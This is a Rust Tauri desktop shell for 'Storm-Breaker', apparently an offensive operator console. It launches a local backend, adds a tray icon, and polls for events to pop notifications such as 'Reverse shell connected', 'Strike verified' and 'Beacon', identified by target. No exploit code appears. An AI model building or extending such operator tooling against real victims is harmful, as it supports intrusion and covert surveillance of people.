// Storm-Breaker Tauri shell (P9.3 + P9.4).
//
// - boots the bundled PyInstaller sidecar (onedir, shipped as a resource)
//   on startup and kills it on exit,
// - the main window points at the sidecar's http://127.0.0.1:2525,
// - closing the window hides to the system tray; tray menu: Show / Quit.
//
// Sidecar layout note (P9.2): the backend ships as an ONEDIR bundle
// (dist/storm-breaker-backend/, copied to resources/sidecar/) so the
// SQLite DB, check-c.json, secret_key.bin and capture dirs persist next
// to the app instead of a per-run temp extraction dir.
#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

use std::sync::Mutex;

use tauri::{
    Manager, RunEvent,
    menu::{Menu, MenuItem},
    tray::TrayIconBuilder,
};
use tauri_plugin_deep_link::DeepLinkExt;
use tauri_plugin_notification::NotificationExt;
use tauri_plugin_shell::process::{CommandChild, CommandEvent};
use tauri_plugin_shell::ShellExt;

/// Minimal blocking HTTP GET over loopback (no extra crate): returns the body.
fn http_get(host: &str, port: u16, path: &str) -> Option<String> {
    use std::io::{Read, Write};
    let mut stream = std::net::TcpStream::connect((host, port)).ok()?;
    stream.set_read_timeout(Some(std::time::Duration::from_secs(3))).ok()?;
    write!(stream, "GET {} HTTP/1.0\r\nHost: {}:{}\r\n\r\n", path, host, port).ok()?;
    let mut raw = String::new();
    stream.read_to_string(&mut raw).ok()?;
    raw.split("\r\n\r\n").nth(1).map(str::to_string)
}

/// P10.2: poll the backend for new events and raise native notifications so the
/// operator is told about a capture/callback without watching the panel.
fn spawn_notifier(app: tauri::AppHandle) {
    std::thread::spawn(move || {
        let mut since = 0f64;
        loop {
            std::thread::sleep(std::time::Duration::from_secs(4));
            let path = format!("/api/notify/pending?since={}", since);
            let Some(body) = http_get("127.0.0.1", 2525, &path) else {
                continue;
            };
            let Ok(json) = serde_json::from_str::<serde_json::Value>(&body) else {
                continue;
            };
            if let Some(now) = json.get("now").and_then(|v| v.as_f64()) {
                since = now;
            }
            let Some(events) = json.get("events").and_then(|v| v.as_array()) else {
                continue;
            };
            for event in events {
                let kind = event.get("kind").and_then(|v| v.as_str()).unwrap_or("event");
                let title = match kind {
                    "listener" => "Reverse shell connected",
                    "strike" => "Strike verified",
                    "beacon" => "Beacon",
                    _ => "Storm-Breaker",
                };
                let who = event
                    .get("uid")
                    .and_then(|v| v.as_str())
                    .or_else(|| event.get("peer").and_then(|v| v.as_str()))
                    .or_else(|| event.get("target").and_then(|v| v.as_str()))
                    .unwrap_or("");
                let _ = app
                    .notification()
                    .builder()
                    .title(title)
                    .body(format!("{} {}", kind, who))
                    .show();
            }
        }
    });
}

/// Handle to the running sidecar child, so we can stop it on exit (P9.3).
/// `Mutex<Option<_>>` because `CommandChild::kill` consumes ownership.
struct SidecarChild(Mutex<Option<CommandChild>>);

fn stop_sidecar(app: &tauri::AppHandle) {
    if let Some(state) = app.try_state::<SidecarChild>() {
        if let Some(child) = state.0.lock().expect("sidecar lock").take() {
            let _ = child.kill();
        }
    }
}

fn sidecar_exe(app: &tauri::AppHandle) -> std::path::PathBuf {
    let dir = app
        .path()
        .resource_dir()
        .expect("no resource dir")
        .join("sidecar/storm-breaker-backend");
    dir.join("storm-breaker-backend")
}

fn main() {
    tauri::Builder::default()
        // P10.3: must be first so a deep link focuses the running app instead
        // of starting a second copy.
        .plugin(tauri_plugin_single_instance::init(|app, _argv, _cwd| {
            if let Some(w) = app.get_webview_window("main") {
                let _ = w.show();
                let _ = w.set_focus();
            }
        }))
        .plugin(tauri_plugin_shell::init())
        .plugin(tauri_plugin_notification::init())   // P10.2
        .plugin(tauri_plugin_deep_link::init())      // P10.3
        .setup(|app| {
            // ---- P9.3: boot the backend sidecar --------------------------
            let exe = sidecar_exe(app.handle());
            let sidecar = app.shell().command(exe);
            let (mut rx, child) = sidecar
                .spawn()
                .expect("failed to start storm-breaker-backend sidecar");
            app.manage(SidecarChild(Mutex::new(Some(child))));

            // pipe sidecar stdout/stderr into this process' log
            tauri::async_runtime::spawn(async move {
                while let Some(event) = rx.recv().await {
                    match event {
                        CommandEvent::Stdout(line)
                        | CommandEvent::Stderr(line) => {
                            println!(
                                "[sidecar] {}",
                                String::from_utf8_lossy(&line)
                            );
                        }
                        _ => {}
                    }
                }
            });

            // ---- P9.4: system tray (Show / Quit) --------------------------
            let show = MenuItem::with_id(app, "show", "Show", true, None::<&str>)?;
            let quit = MenuItem::with_id(app, "quit", "Quit", true, None::<&str>)?;
            let menu = Menu::with_items(app, &[&show, &quit])?;

            TrayIconBuilder::with_id("main-tray")
                .icon(app.default_window_icon().unwrap().clone())
                .tooltip("Storm-Breaker")
                .menu(&menu)
                .on_menu_event(|app, event| match event.id.as_ref() {
                    "show" => {
                        if let Some(w) = app.get_webview_window("main") {
                            let _ = w.show();
                            let _ = w.set_focus();
                        }
                    }
                    "quit" => {
                        // stop the sidecar, then exit for real
                        stop_sidecar(app);
                        app.exit(0);
                    }
                    _ => {}
                })
                .build(app)?;

            // ---- P10.2: native notifications on live events ----------------
            spawn_notifier(app.handle().clone());

            // ---- P10.3: storm:// deep links --------------------------------
            {
                let handle = app.handle().clone();
                app.deep_link().on_open_url(move |event| {
                    for url in event.urls() {
                        let path = url.path().trim_start_matches('/').to_string();
                        let target = if path.is_empty() || path == "panel" {
                            "http://127.0.0.1:2525/panel".to_string()
                        } else if let Some(name) = path.strip_prefix("t/") {
                            format!("http://127.0.0.1:2525/t/{}/", name)
                        } else {
                            format!("http://127.0.0.1:2525/{}", path)
                        };
                        if let Some(window) = handle.get_webview_window("main") {
                            let _ = window.show();
                            let _ = window.set_focus();
                            let _ = window.eval(&format!("window.location.href = {:?};", target));
                        }
                    }
                });
            }

            Ok(())
        })
        .on_window_event(|window, event| {
            // P9.4: the [X] button hides to tray instead of quitting; use
            // the tray Quit to actually exit (stops the sidecar first).
            if let tauri::WindowEvent::CloseRequested { api, .. } = event {
                let _ = window.hide();
                api.prevent_close();
            }
        })
        .build(tauri::generate_context!())
        .expect("error while building tauri application")
        .run(|app_handle, event| {
            if let RunEvent::Exit = event {
                // P9.3: make sure the sidecar never outlives the shell
                stop_sidecar(app_handle);
            }
        });
}
